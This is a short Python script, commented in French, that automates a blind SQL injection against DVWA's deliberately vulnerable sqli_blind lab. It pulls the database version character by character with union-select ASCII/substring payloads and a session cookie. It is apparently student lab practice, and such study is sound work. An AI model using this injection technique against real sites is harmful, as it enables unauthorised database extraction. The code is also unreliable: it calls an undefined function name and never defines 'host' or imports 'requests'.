# ======== BLind SQLI ========
# Security : Medium (mais go changer pour Low)

def blind_sqli(base, cookies, ok):
    print("--Blind SQLi on progress--")
    colonne_dbonne = 1
    data_v = ""
    itr = list(range(32,127))
    while True:
        found = False
        for nmbr in itr:
            #payload
            url = base + "?id=-1+union+select+null%2CASCII%28substring%28%40%40version%2C" + str(colonne_dbonne) + \
                  "%2C1%29%29%3D" + str(nmbr) + "%23&Submit=Submit#"
            try:
                response = requests.get(url, headers={'Cookie': cookies}, timeout=5).text
            except:
                pass
            if ok in response:
                data_v = data_v + chr(nmbr)
                found = True
                break
        colonne_dbonne = colonne_dbonne + 1
        if not found:
            break
    return data_v

OK_SRCH = "name: 1"
# HIchem faut que tu mexplique comment tu geres les cookies avec session.get(url)
cookies = "security=medium; PHPSESSID=xxx"
# Change your IP
url_base = host + "dvwa/vulnerabilities/sqli_blind/"
print("Version: " + blind_sql(url_base, cookies, OK_SRCH))